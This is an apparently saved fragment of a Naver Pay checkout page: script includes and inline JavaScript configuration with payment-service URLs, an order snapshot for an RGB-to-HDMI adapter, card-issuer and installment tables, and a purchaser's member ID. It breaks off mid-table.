					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.DataRequester.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.ExtendGrid.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.CategorySelectorBase.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.CategorySelectorForSelectBox.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.FormHelper.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.AffiliateLayerLoader.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.RollingList.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/c/commonjs/static/js/common/lcslog-0.8.4.js" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/c/commonjs/mobile_static/js/jindo/mobile_component/jindo.m.js" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/c/commonjs/mobile_static/js/jindo_2_11_0/mobile_component/jindo.m.component.merged.js" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common_timeline/jindo_component_1_14_0/jindo-component.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/formatter.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/ui.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/popup.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/fieldMergeUtil.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/order_sheet.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/cstatic/js/component/nmp.component.Calculator.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/cstatic/js/component/nmp.component.OrderProductCalculator.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/order_sheet/storage.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/order_sheet/integration_cart.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/tveta/libs/ssp/polyfill/js/ssp.polyfill.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/order_glad.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript">
					   lcs_do();
					nmp.registerModule(nmp.layer, {"bKeyActionUse" : true});
					nmp.registerModule(nmp.front.order.ui);
					nmp.registerModule(nmp.front.order);
					nmp.registerModule(nmp.front.order.fieldMergeUtil);
					nmp.registerModule(nmp.front.order.popup, {
					"urls" : 	{
								"benefit.front.order.popup.refundmentAccountBook" : "http://pay.naver.com/mypage/refundmentAccountList",
								"front.order.popup.addressBook" : "http://pay.naver.com/mypage/deliveryPlaceList",
								"front.order.popup.addressBook.new" : "http://pay.naver.com/shipping/popup/list",
							"":""
						}
					,
					"isDeliveryAddressAgreed" : true,
					"" : ""
					});
					
					nmp.registerModule(nmp.front.order.order_sheet,{
					"urls" : 	{
								"user.front.myPage.update" : "http://pay.naver.com/mypage/update",
								"user.front.myPage.simple.update" : "http://pay.naver.com/mypage/simpleUpdatePopup",
								"user.front.email.update" : "http://new-m.pay.naver.com/member/user-info/email",
								"user.front.cellphone.update" : "http://new-m.pay.naver.com/member/user-info/mobile-number",
								"mileage.popup.agree" : "http://mileage.naver.com/customer/popup/member/agree?returnUrl=http://order.pay.naver.com/orderSheetPopup/agreeCallback",
								"naver.don.pay.popup" : "http://bill.naver.com/pay/payment.nhn?CHNL=NV&RSVSEQ=",
								"naver.don.agree.popup" : "http://pay.naver.com/naverCashAgree",
								"order.pay.progress" : "http://order.pay.naver.com/orderSheetPopup/payProgress",
								"user.front.host" : "pay.naver.com",
								"pay.password.authentification.popup.url" : "http://new.pay.naver.com/auth/check",
								"pay.ars.authentification.popup.url" : "http://nid.naver.com/iasystem/pop.nhn?todo=pers_popup_ars&target=persAuth_popup",
								"pay.authentification.return.url" : "http://order.pay.naver.com/orderSheetPopup/naverPayAuthResult?d=",
								"pay.password.init.popup.url" : "http://nid.naver.com/user2/naverPay.nhn?m=viewAuthNaverPayPasswd",
								"pay.limit.conf.url" : "http://new-m.pay.naver.com/settings/payment-security/pay",
								"member.cardpoint.amount.pc.url" : "http://pay.naver.com/userpoint/api/cardpoint/totalAmount",
								"member.cardpoint.callback.pc.url" : "http://pay.naver.com/userpoint/cardpoint/info?displayType=PC&callback=",
								"point.charge.pc.url" : "http://pay.naver.com/userpoint/api/chargepoint/orderinfo?type=PC",
								"charge.pay.url" : "http://pay.naver.com/npoint/pay/charge.naver?CHNL=NV&RURL=",
								"order.ordersheet.url" : "http://order.pay.naver.com/orderSheet/",
								"pc.easy.card.register.url" : "http://dbill.naver.com/build/index.html#/card-registration",
								"pc.easy.bank.register.url" : "http://pay.naver.com/send/p/account/selectBank",
								"order.ordersheet.registration.creditCard.return.url" : "http://order.pay.naver.com/orderSheetPopup/callback/registration/creditCard/success",
								"order.ordersheet.registration.creditCard.cancel.url" : "http://order.pay.naver.com/orderSheetPopup/callback/registration/creditCard/fail",
								"order.ordersheet.registration.bank.return.url" : "http://order.pay.naver.com/orderSheetPopup/callback/registration/bank/success",
								"order.ordersheet.registration.bank.cancel.url" : "http://order.pay.naver.com/orderSheetPopup/callback/registration/bank/fail",
								"member.auth.popup.url" : "http://order.pay.naver.com/memberAuth/popup",
								"adult.authentication.popup.url" : "http://nid.naver.com/iasystem/pop.nhn",
								"adult.authentication.return.url" : "http://order.pay.naver.com/orderSheetPopup/callback/adult/authentication",
								"partnership.shinhan.card.campaign.url" : "http://campaign.naver.com/event/npay-shinhanassociated_2009",
								"paylater.home.url" : "http://new-m.pay.naver.com/paylater",
								"paylater.signup.url" : "http://new-m.pay.naver.com/paylater/signup",
								"paylater.overdue.url" : "http://new-m.pay.naver.com/paylater/overdue",
								"paylater.payment.url" : "http://new-m.pay.naver.com/paylater/payment",
								"paylater.guide.url" : "http://new-m.pay.naver.com/paylater/guide",
								"paylater.callback.done" : "http://order.pay.naver.com/orderSheetPopup/callback/paylater/done",
								"membership.plcc.issue.url" : "http://campaign.naver.com/naverhyundaicard/?",
							"":""
						}
					,
					"isIE9" : "",
					"cashReceiptIssuePossiblePayMeans" : [	'BANK', 'VIRTUAL_ACCOUNT', 'CHARGED_POINT', 'PAY_LATER'
					],
					"orderClass" : "INTEGRATION_CART",
					"orderSnapshot" : {"saleChannelType":"SHOPN","orderSheetEntryType":"BUY_IMMEDIATELY","receiptIssue":true,"easyBooking":false,"localPay":false,"orderProducts":[{"orderAmount":15000,"merchantNo":510126036,"purchasable":true,"deliveryGroup":{"appliedExtraAreaFee":0,"bundle":true,"fee":2500,"appliedProductId":"2022031423515848","deliveryMethod":"DELIVERY","deliveryFeePayType":"PRE_PAY","id":"2022031490319617"},"items":[{"orderAmount":15000,"quantity":1,"purchasable":true,"payAmount":8700,"discountAmount":6300,"itemNo":"21998136642","price":0,"elements":[{"id":"21998136642","names":["선택"],"texts":["01_RGB to HDMI 젠더"],"type":"COMBINATION"}],"current":{"discounts":[{"discountPolicy":{"requiredCoupon":false,"mobileOnly":false,"sellerImmediateDiscountType":"IMMEDIATE","discountType":"SELLER_IMMEDIATE_DISCOUNT","policyNo":"SE_2512426784","discountUnit":"AMOUNT","discountValue":6300,"providerType":"MERCHANT"},"discountAmount":6300,"couponName":"즉시할인","applyCount":1,"unitDiscountAmount":6300,"available":true}],"sellerImmediateDiscount":{"discountPolicy":{"requiredCoupon":false,"mobileOnly":false,"sellerImmediateDiscountType":"IMMEDIATE","discountType":"SELLER_IMMEDIATE_DISCOUNT","policyNo":"SE_2512426784","discountUnit":"AMOUNT","discountValue":6300,"providerType":"MERCHANT"},"discountAmount":6300,"couponName":"즉시할인","applyCount":1,"unitDiscountAmount":6300,"available":true},"nmpMileage":{"basisAmount":87,"amount":87,"policy":{"accumulatedUnit":"RATE","accumulatedValue":1.0}},"totalNaverBenefitOnMileageAmount":87,"totalMileageAmount":87,"immediateDiscountAmount":6300},"id":"2022031426018307","type":"PRICING_OPTIONAL"}],"wholeCategoryId":"50000003>50000097>50001222>50003125","imageUrl":"http://shop1.phinf.naver.net/20220204_190/1643966214943ghT5c_JPEG/45102113427984279_482936723.jpg","benefits":{"benefitPolicies":{"sellerImmediateDiscount":{"requiredCoupon":false,"mobileOnly":false,"sellerImmediateDiscountType":"IMMEDIATE","discountType":"SELLER_IMMEDIATE_DISCOUNT","policyNo":"SE_2512426784","discountUnit":"AMOUNT","discountValue":6300,"providerType":"MERCHANT"},"immediateDiscountPolicies":[{"requiredCoupon":false,"mobileOnly":false,"sellerImmediateDiscountType":"IMMEDIATE","discountType":"SELLER_IMMEDIATE_DISCOUNT","policyNo":"SE_2512426784","discountUnit":"AMOUNT","discountValue":6300,"providerType":"MERCHANT"}],"nmpMileage":{"accumulatedUnit":"RATE","accumulatedValue":1.0},"nmpTextReviewMileage":{"accumulatedValue":50.0},"nmpPhotoVideoReviewMileage":{"accumulatedValue":150.0}}},"productId":"2515203719","salePrice":15000,"adultUser":false,"deliveryFee":{"freeConditionalAmount":0,"secondExtraFee":0,"thirdExtraFee":0,"baseFee":2500,"type":"CHARGE"},"sellerManagementCode":"NEXI","regDate":1647221954000,"totalPurchaseReviewNstamp":0,"totalPremiumPurchaseReviewNstamp":0,"totalPurchaseReviewMileage":50,"totalPremiumPurchaseReviewMileage":150,"securedImageUrl":"/o/proxy/phinf/shop1/20220204_190/1643966214943ghT5c_JPEG/45102113427984279_482936723.jpg","serviceType":"MP","name":"RGB to HDMI 젠더 변환 VGA to HDM 컨버터 모니터 잭","id":"2022031423515848"}],"orderClassType":"INTEGRATION_CART","orderSnapshotKey":"b78c81ab-8b44-486f-a3da-75000ef66b86","deliveryGroupMap":{"2022031490319617":{"appliedExtraAreaFee":0,"bundle":true,"fee":2500,"appliedProductId":"2022031423515848","deliveryMethod":"DELIVERY","deliveryFeePayType":"PRE_PAY","id":"2022031490319617"}},"deliveryFeeGroupMap":{"2022031490319617":2500},"userId":238621119,"escrowYn":false,"skipMallContractAgreement":false,"cultureBenefitYn":false,"productsOrderAmount":15000,"productsPayAmount":8700,"deliverysPayAmount":2500,"availableMainOrderQuantity":1,"orderPayAmount":11200,"orderDiscountAmount":0,"storeDiscounts":{},"storeDiscountAmount":0,"totalDiscountAmount":6300,"productAndStoreDiscountAmount":6300,"deliveryFeeDiscountAmount":0,"productsDiscountAmount":6300,"purchaser":{"memberId":"kikim0090","memberNumber":238621119},"deliveryNothing":false,"additionalInfoSupported":false,"styleWindow":false,"naverCafe":false,"exclusiveUseOfNaverBilling":false,"gifting":false,"branch":false,"naverBlog":false,"membershipExpectPoints":{"present":false},"totalMembershipExpectPoint":0,"subscription":false,"serviceType":"MP"},
					"privateCertificationLimit": 1,
					"remainNaverDon" : 0,
					"remainTotalNaverPoint" : 0,
					"remainNaverMileage" : 0,
					"remainChargeAmount" : 450000,
					"remainChargedPoint" : 0,
					"remainChargeLimit" : 450000,
					"remainPayLaterAmount" : 0,
					"isExistEcouponProduct" : false,
					"backUrl" : "http://smartstore.naver.com/withit/products/2515203719",
					"pgId" : "",
					"creditCardInfos" : {"CC":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_JBbank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"전북","pointdesc":"","corpcd":"CC","priority":"10"},"CD":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_jejubank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"제주","pointdesc":"","corpcd":"CD","priority":"11"},"CF":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_hanacard.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"하나","pointdesc":"","corpcd":"CF","priority":"13"},"CH":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_hyundaicard.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"현대","pointdesc":"","corpcd":"CH","priority":"2"},"C0":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_shinhanbank.gif","pointdescurl":"http://www.shinhancard.com/","pointname":"신한","pointusefg":"N","name":"신한카드","pointdesc":"신한카드 결제 시 신한 포인트 사용에 체크하신 후 결제하시면 됩니다.","corpcd":"C0","priority":"5"},"CP":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_kakaobank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"카카오뱅크","pointdesc":"","corpcd":"CP","priority":"22"},"C1":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_BCcard.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"BC카드","pointdesc":"","corpcd":"C1","priority":"21"},"C2":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_KJbank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"광주","pointdesc":"","corpcd":"C2","priority":"21"},"CR":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_BCcard.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"유니온페이","pointdesc":"","corpcd":"CR","priority":"0"},"C3":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_KBbank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"국민","pointdesc":"","corpcd":"C3","priority":"1"},"C4":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_NH.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"NH","pointdesc":"","corpcd":"C4","priority":"2"},"C5":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_lottecard.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"롯데","pointdesc":"","corpcd":"C5","priority":"3"},"C6":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_KDB.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"산은","pointdesc":"","corpcd":"C6","priority":"4"},"C7":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_samsung.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"삼성","pointdesc":"","corpcd":"C7","priority":"1"},"C8":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_suhyupbank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"수협","pointdesc":"","corpcd":"C8","priority":"6"},"C9":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_citibank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"시티","pointdesc":"","corpcd":"C9","priority":"7"},"CA":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_hanacard.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"외환","pointdesc":"","corpcd":"CA","priority":"4"},"CB":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_wooribank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"우리","pointdesc":"","corpcd":"CB","priority":"9"}},
					"mileageMap" : {"TOTAL":87,"TOTAL_ADDITIONAL":0,"TOTAL_SCM":0,"TOTAL_MEMBERSHIP":0,"TOTAL_INFLOW":0,"2022031423515848":87,"TOTAL_ADMIN_ADDITIONAL":0,"TOTAL_PURCHASE":87},
					"purchaserPaymentInfo" : "",
					"defaultPaymentInfo" : {"easyPayYn":true,"cardCompanyTypeCode":"NC","payMeansClassType":"CREDIT_CARD"},
					"defaultSubPaymentInfo" : {"payMeansClassType":"CHARGED_POINT"},
					"restrictedReliefNumberList" :$A(["070","080","0130","0303","0502","0503","0504","0505","0506","0507","0508","050"]),
					"checkoutMerchantJson" : $H(),
					"nMileageExpireInfo" : {},
					"hasRegisteredEasyCard" : false,
					"hasRegisteredEasyBank" : false,
					"easyCardCode" : $A(["C0","CH","C7","C1","C3","CF","C5","C4","C9","CP","NC"]),
					"easyBankCode" : $A(["011","004","088","020","003","023","032","039","007","071","240","238","031","034","037","045","035","048","081","089","090","002","103","027","209","280","243","050","266","092","278","999"]),
					"registrationMethodCodeMap" : {"CREDIT_CARD":"NC","BANK":"999"},
					"availableCreditCardCorp" : ["C3","C1","C0","CH","C7","C5","CA","C4","CF","CB","C2","C8","C9","CC","CD","CP","CQ","CR"],
					"memberTelNumber":"010-9**7-0**0",
					"switchPayment" : false,
					"payMeansInquiryList" : [],
					"mallInfo" : "",
					"restrictPayMeans" : $A([]),
					"isEasyBooking" : false,
					"easyPayMileageRange" : "",
					"easyPayMileageMap" : "",
					"totalEasybookingMileage" : 0,
					"payEventBankRegisterAmount" : 0,
					"simplePaymentInfo" : false,
					"isForcedBillingPayment" : false,
					"isEscrow" : false,
					"isPinPayMember" : false,
					"isPinPayAgree":  false,
					"isDeliveryAddressAgreed" : true,
					"isAdult" : false,
					"registeredRecentPayMethodList" : $A(),
					"partnershipCardCodeList" : $A(),
					"isDiscountOptimization" : true,
					"hasTraditionalAlcoholProduct" :  false,
					"creditCardInstallmentUnavailableList" : $A(["CP","CR"]),
					"isOpenBankAgreed" :  true,
					"usePointAllYn": false,
					"usePayLaterAllYn": false,
					"useChargePointYn" : null,
					"isNaverBankbookRecentCharged" : false,
					"shinhanPartnershipCardReturnUrl" : "http://order.pay.naver.com/orderSheet/b78c81ab-8b44-486f-a3da-75000ef66b86/integrationCart?backUrl=http%3A%2F%2Fsmartstore.naver.com%2Fwithit%2Fproducts%2F2515203719",
					"totalDeliveryCouponCount" : 0,
					"serviceType":"MP",
					"cultureBenefitYn":"false",
					"hasMileagePay":"false",
					"deposits": "",
					
					"membershipPlccExpectedPercentage":"0.05",
					"membershipPlccExpectedMaximumAmount":"10,000",
					
					
					
					"allEasyBankUnderMaintenance":false,
					"hasPayableBank" : false,
					"":""
					});
					
					nmp.registerModule(nmp.front.order.order_sheet.integration_cart, {
					"urls" : 	{
								"order.ordersheet.mobile.return.url" : "http://order.pay.naver.com/orderSheetPopup/mobileResult",
								"order.ordersheet.pinMobile.return.url" : "http://order.pay.naver.com/orderSheetPopup/pinMobileResult",
								"order.ordersheet.easyPay.creditCard.return.url" : "http://order.pay.naver.com/orderSheetPopup/easyPayCreditCardSuccessResult",
								"order.ordersheet.easyPay.creditCard.cancel.url" : "http://order.pay.naver.com/orderSheetPopup/easyPayCreditCardFailResult",
								"order.ordersheet.easyPay.bank.return.url" : "http://order.pay.naver.com/orderSheetPopup/easyPayBankSuccessResult",
								"order.ordersheet.easyPay.bank.cancel.url" : "http://order.pay.naver.com/orderSheetPopup/easyPayBankFailResult",
								"order.ordersheet.generalPay.creditCard.return.url" : "http://order.pay.naver.com/orderSheetPopup/EUC-KR/creditCardResult",
								"order.ordersheet.generalPay.bank.return.url" : "http://order.pay.naver.com/orderSheetPopup/EUC-KR/bankResult",
							"":""
						}
					,
					"backUrl" : "http://smartstore.naver.com/withit/products/2515203719",
					"orderSnapshotKey":"b78c81ab-8b44-486f-a3da-75000ef66b86",
					"orderClass" : "INTEGRATION_CART",
					"creditPointArr": $H({CC:"",CD:"",CF:"",CH:"",C0:"신한",CP:"",C1:"",C2:"",CR:"",C3:"",C4:"",C5:"",C6:"",C7:"",C8:"",C9:"",CA:"",CB:""}),    
					"noInterestArr": $H({C5:"2,3,4,12,18,24,36",C7:"2,3,4,5,6,10,12,18,24",C3:"2,3,4,5,6,7,10,12",C4:"2,3,4,5,6,7,8,10,12",CH:"2,3,4,5,6,7,10",CA:"2,3,4,5,6,7,8,10,12",C0:"2,3,4,5,6,7,10,12",CB:"2,3,4,5,6,7,10,12",CC:"2,3,4,5,6,7,8,9,10,11,12",CF:"2,3,4,5,6,7,8,10,12",C2:"2,3,4,5,6,7",C1:"2,3,4,5,6,7,10,12"}),
					"payMeansInfos": {'OBANK':'40001','OBANK_minamt':'0','OBANK_maxamt':'0','OBANK_prvsnurl':'','OBANK_cinf':'','OCREDIT_CARD':'51277','OCREDIT_CARD_minamt':'10','OCREDIT_CARD_maxamt':'0','OCREDIT_CARD_prvsnurl':'','OCREDIT_CARD_cinf':'','BANK':'04001','BANK_minamt':'1000','BANK_maxamt':'2000000','BANK_prvsnurl':'','BANK_cinf':'1544-7772','MOBILE_PIN':'60001','MOBILE_PIN_minamt':'100','MOBILE_PIN_maxamt':'300000','MOBILE_PIN_prvsnurl':'http://mcash.mobilians.co.kr/web/m_mcash_terms_payment.html','MOBILE_PIN_cinf':'1600-0523, help@mobilians.co.kr','MOBILE':'05005','MOBILE_minamt':'10','MOBILE_maxamt':'300000','MOBILE_prvsnurl':'http://mcash.mobilians.co.kr/web/use_contract_dongijok.html','MOBILE_cinf':'1600-0523, help@mobilians.co.kr','CREDIT_CARD':'01057','CREDIT_CARD_minamt':'10','CREDIT_CARD_maxamt':'0','CREDIT_CARD_prvsnurl':'','CREDIT_CARD_cinf':'','VIRTUAL_ACCOUNT':'02001','VIRTUAL_ACCOUNT_minamt':'10','VIRTUAL_ACCOUNT_maxamt':'0','VIRTUAL_ACCOUNT_prvsnurl':'','VIRTUAL_ACCOUNT_cinf':'02-588-2722','DON':'71001'},
					"noInterestMonthArr": $H({C512:"12",C518:"18",C524:"24",C536:"36",C512:"12",C518:"18",C524:"24",C536:"36",C52:"2",C53:"3",C54:"4",C72:"2",C73:"3",C74:"4",C75:"5",C76:"6",C710:"10|1,2,3,4",C712:"12|1,2,3,4,5",C718:"18|1,2,3,4,5,6,7",C724:"24|1,2,3,4,5,6,7,8,9",C32:"2",C33:"3",C34:"4",C35:"5",C36:"6",C37:"7",C310:"10|1,2,3",C312:"12|1,2,3,4",C42:"2",C43:"3",C44:"4",C45:"5",C46:"6",C47:"7",C48:"8",C410:"10|1,2,3",C412:"12|1,2,3,4",CH2:"2",CH3:"3",CH4:"4",CH5:"5",CH6:"6",CH7:"7",CH10:"10",CA2:"2",CA3:"3",CA4:"4",CA5:"5",CA6:"6",CA7:"7",CA8:"8",CA10:"10|1,2,3",CA12:"12|1,2,3,4",C02:"2",C03:"3",C04:"4",C05:"5",C06:"6",C07:"7",C010:"10",C012:"12|1,2,3,4,5",CB2:"2",CB3:"3",CB4:"4",CB5:"5",CB6:"6",CB7:"7",CB10:"10|1,2,3",CB12:"12|1,2,3,4",CC2:"2",CC3:"3",CC4:"4",CC5:"5",CC6:"6",CC7:"7|1",CC8:"8|1",CC9:"9|1",CC10:"10|1,2",CC11:"11|1,2",CC12:"12|1,2",CF2:"2",CF3:"3",CF4:"4",CF5:"5",CF6:"6",CF7:"7",CF8:"8",CF10:"10|1,2,3",CF12:"12|1,2,3,4",C22:"2",C23:"3",C24:"4",C25:"5",C26:"6",C27:"7",C12:"2",C13:"3",C14:"4",C15:"5",C16:"6",C17:"7",C110:"10|1,2,3",C112:"12|1,2,3,4"}),
					"freeInterests" : {"CC":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004035","month":"2","corpcd":"CC","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004035","month":"3","corpcd":"CC","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004035","month":"4","corpcd":"CC","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004035","month":"5","corpcd":"CC","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004035","month":"6","corpcd":"CC","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1","chrgtype":"01","frinttypename":"부분","frintseq":"10004104","month":"7","corpcd":"CC","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1","chrgtype":"01","frinttypename":"부분","frintseq":"10004037","month":"8","corpcd":"CC","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1","chrgtype":"01","frinttypename":"부분","frintseq":"10004038","month":"9","corpcd":"CC","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2","chrgtype":"01","frinttypename":"부분","frintseq":"10004039","month":"10","corpcd":"CC","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2","chrgtype":"01","frinttypename":"부분","frintseq":"10004040","month":"11","corpcd":"CC","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2","chrgtype":"01","frinttypename":"부분","frintseq":"10004041","month":"12","corpcd":"CC","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"CF":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"2","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"3","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"4","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"5","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"6","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"7","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"8","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3","chrgtype":"01","frinttypename":"부분","frintseq":"10004026","month":"10","corpcd":"CF","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004027","month":"12","corpcd":"CF","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"CH":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004103","month":"2","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"10000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004103","month":"3","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"10000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004103","month":"4","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"10000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004103","month":"5","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"10000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004103","month":"6","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"10000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004103","month":"7","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"10000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004018","month":"10","corpcd":"CH","frinttype":"01","corpname":"","chrgtypena